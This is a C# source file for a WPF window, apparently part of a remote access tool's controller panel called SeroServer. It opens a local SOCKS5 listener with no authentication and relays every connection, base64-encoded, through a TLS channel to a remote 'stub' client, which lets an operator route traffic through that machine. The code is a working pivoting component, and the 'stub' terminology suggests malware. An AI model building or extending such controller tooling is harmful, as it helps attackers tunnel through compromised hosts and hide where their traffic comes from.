using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class Socks5Window : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool _running;
    private TcpListener? _listener;
    private int _connCount;

    // sessionId → TcpClient waiting for data from stub
    private readonly ConcurrentDictionary<string, TcpClient> _pending = new();

    public Socks5Window(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;

        _server.RegisterHandler(clientId, PacketType.SocksConnOk,  OnConnOk);
        _server.RegisterHandler(clientId, PacketType.SocksConnErr, OnConnErr);
        _server.RegisterHandler(clientId, PacketType.SocksData,    OnData);
        _server.RegisterHandler(clientId, PacketType.SocksClose,   OnRemoteClose);

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            StopProxy();
            _server.UnregisterHandler(clientId, PacketType.SocksConnOk);
            _server.UnregisterHandler(clientId, PacketType.SocksConnErr);
            _server.UnregisterHandler(clientId, PacketType.SocksData);
            _server.UnregisterHandler(clientId, PacketType.SocksClose);
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    // ── Start / Stop ────────────────────────────────────────────────────────

    private void ApplyLanguage()
    {
        this.Title = Lang.Get("FEAT_SOCKS5");
        if (BtnStart != null) BtnStart.Content = Lang.Get("ACT_START");
        if (BtnStop  != null) BtnStop.Content  = Lang.Get("ACT_STOP");
    }

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
        { TxtStatus.Text = Lang.Get("ERR_INVALID_PORT"); return; }

        ServerWindow.ReportGlobalActivity("SOCKS5 Proxy", $"Port {port}", "running");
        ServerWindow.LogGlobal($"[SOCKS5] Starting SOCKS5 proxy on local port {port} targeting client {_clientId}...");

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.SocksStart,
            Data = JsonConvert.SerializeObject(new SocksStartData { LocalPort = port })
        });

        _running = true;
        BtnStart.IsEnabled = false; BtnStop.IsEnabled = true;
        BadgeActive.Visibility = Visibility.Visible;

        try
        {
            _listener = new TcpListener(IPAddress.Loopback, port);
            _listener.Start();
            TxtStatus.Text = string.Format(Lang.Get("SOCKS5_LISTENING"), port);
            AddLog($"[+] Started on port {port}");
            ServerWindow.ReportGlobalActivity("SOCKS5 Proxy", $"Port {port}", "success");
            ServerWindow.LogGlobal($"[SOCKS5] SOCKS5 proxy running on local port {port} for client {_clientId}.");
            _ = AcceptLoop();
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("SOCKS5 Proxy", $"Port {port}", "failed");
            ServerWindow.LogGlobal($"[SOCKS5] SOCKS5 proxy failed to start on port {port}: {ex.Message}");
            StopProxy(logStop: false);
        }
    }

    private async void BtnStop_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.SocksStop });
        StopProxy(logStop: true);
    }

    private void StopProxy(bool logStop = true)
    {
        _running = false;
        _listener?.Stop(); _listener = null;
        foreach (var t in _pending.Values) try { t.Close(); } catch { }
        _pending.Clear();
        if (logStop)
        {
            ServerWindow.ReportGlobalActivity("SOCKS5 Proxy", $"Port {TxtPort.Text}", "complete");
            ServerWindow.LogGlobal($"[SOCKS5] Stopped SOCKS5 proxy for client {_clientId}.");
        }
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled = true; BtnStop.IsEnabled = false;
            BadgeActive.Visibility = Visibility.Collapsed;
            TxtStatus.Text = Lang.Get("STOPPED");
        });
    }

    // ── Local SOCKS5 accept loop ─────────────────────────────────────────────

    private async Task AcceptLoop()
    {
        while (_running)
        {
            try
            {
                var client = await _listener!.AcceptTcpClientAsync();
                _ = HandleLocalClient(client);
            }
            catch { break; }
        }
    }

    // Read exactly 'count' bytes from stream into buf starting at offset
    private static async Task ReadExact(NetworkStream stream, byte[] buf, int offset, int count)
    {
        int got = 0;
        while (got < count)
        {
            int r = await stream.ReadAsync(buf.AsMemory(offset + got, count - got));
            if (r == 0) throw new Exception("Connection closed");
            got += r;
        }
    }

    private async Task HandleLocalClient(TcpClient client)
    {
        string sessionId = Guid.NewGuid().ToString("N")[..8];
        try
        {
            var stream = client.GetStream();
            var buf = new byte[512];

            // SOCKS5 greeting: VER(1) + NMETHODS(1) + METHODS(n)
            await ReadExact(stream, buf, 0, 2);
            int nMethods = buf[1];
            if (nMethods > 0) await ReadExact(stream, buf, 2, nMethods);
            await stream.WriteAsync(new byte[] { 5, 0 }); // NO AUTH

            // SOCKS5 connect request: VER(1) CMD(1) RSV(1) ATYP(1) + addr + port
            await ReadExact(stream, buf, 0, 4);
            int addrBytes = buf[3] switch
            {
                1 => 4,          // IPv4
                4 => 16,         // IPv6
                3 => buf[4] + 1, // domain: 1 len byte + domain bytes
                _ => throw new Exception("Unknown ATYP")
            };
            // For domain, we already read 4 bytes; buf[4] will have length after next read
            int totalAddrPort = (buf[3] == 3 ? 1 : 0) + addrBytes + 2; // +1 for domain len byte, +2 for port
            if (buf[3] == 3)
            {
                await ReadExact(stream, buf, 4, 1); // domain length byte
                addrBytes = buf[4];
                await ReadExact(stream, buf, 5, addrBytes + 2); // domain + port
                totalAddrPort = 1 + addrBytes + 2;
            }
            else
            {
                await ReadExact(stream, buf, 4, addrBytes + 2); // addr + port
            }
            int connectLen = 4 + (buf[3] == 3 ? 1 + addrBytes + 2 : addrBytes + 2);
            _pending[sessionId] = client;

            // Forward to stub
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.SocksData,
                Data = JsonConvert.SerializeObject(new SocksDataPacket
                {
                    SessionId = sessionId,
                    Data = Convert.ToBase64String(buf, 0, connectLen)
                })
            });

            _connCount++;
            _ = Dispatcher.BeginInvoke(() => TxtConnCount.Text = $"{_connCount} active");
            AddLog($"[>] Session {sessionId}  local:{((System.Net.IPEndPoint?)client.Client.RemoteEndPoint)?.Port}");

            // Now relay from local to stub
            var relay = new byte[8192];
            while (_running && client.Connected)
            {
                int r = await stream.ReadAsync(relay);
                if (r == 0) break;
                await _server.SendToClient(_clientId, new Packet
                {
                    Type = PacketType.SocksData,
                    Data = JsonConvert.SerializeObject(new SocksDataPacket
                    {
                        SessionId = sessionId,
                        Data = Convert.ToBase64String(relay, 0, r)
                    })
                });
            }
        }
        catch { }
        finally
        {
            _pending.TryRemove(sessionId, out _);
            try { client.Close(); } catch { }
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.SocksClose,
                Data = JsonConvert.SerializeObject(new SocksCloseData { SessionId = sessionId })
            });
        }
    }

    // ── Incoming from stub ───────────────────────────────────────────────────

    private void OnConnOk(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
        if (d == null) return;
        if (_pending.TryGetValue(d.SessionId, out var client))
        {
            // Send SOCKS5 success reply
            var reply = new byte[] { 5, 0, 0, 1, 0, 0, 0, 0, 0, 0 };
            try { _ = client.GetStream().WriteAsync(reply); } catch { }
            AddLog($"[✓] {d.SessionId} connected");
        }
    }

    private void OnConnErr(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
        if (d == null) return;
        if (_pending.TryRemove(d.SessionId, out var client))
        {
            var reply = new byte[] { 5, 4, 0, 1, 0, 0, 0, 0, 0, 0 }; // Host unreachable
            try { _ = client.GetStream().WriteAsync(reply); client.Close(); } catch { }
        }
        AddLog($"[✗] {d.SessionId}: {d.Error}");
    }

    private void OnData(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksDataPacket>(pkt.Data);
        if (d == null || string.IsNullOrEmpty(d.Data)) return;
        if (_pending.TryGetValue(d.SessionId, out var client))
        {
            var bytes = Convert.FromBase64String(d.Data);
            try { _ = client.GetStream().WriteAsync(bytes); } catch { }
        }
    }

    private void OnRemoteClose(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksCloseData>(pkt.Data);
        if (d == null) return;
        if (_pending.TryRemove(d.SessionId, out var client))
            try { client.Close(); } catch { }
        AddLog($"[-] {d.SessionId} closed by remote");
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private void AddLog(string msg)
    {
        Dispatcher.BeginInvoke(() =>
        {
            TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
            LogScroll.ScrollToEnd();
        });
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
